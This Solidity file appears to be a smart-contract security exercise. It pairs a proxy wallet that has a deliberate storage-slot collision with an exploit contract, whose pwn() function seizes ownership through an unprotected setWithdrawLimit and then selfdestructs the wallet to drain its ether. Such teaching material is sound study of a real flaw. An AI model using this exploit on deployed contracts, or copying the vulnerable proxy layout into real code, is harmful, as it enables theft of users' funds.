// SPDX-License-Identifier: MIT

/**
BurnerWallet is upgradable, fowards all calls to BurnerWalletImplementation.

The owner of BurnerWallet can delete the contract by calling kill.

*/


pragma solidity ^0.8.17;

contract BurnerWallet {
    address public implementation;
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }

    function kill() external {
        require(msg.sender == owner, "not owner");
        selfdestruct(owner);
    }
}

contract BurnerWalletImplementation {
    address public implementation;
    uint public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}

interface IBurnerWallet {
    function setWithdrawLimit(uint limit) external;

    function kill() external;
}

contract BurnerWalletExploit {
    address public target;
    
    receive() external payable {}

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        IBurnerWallet(target).setWithdrawLimit(uint(uint160(address(this))));
        IBurnerWallet(target).kill();
    }
}
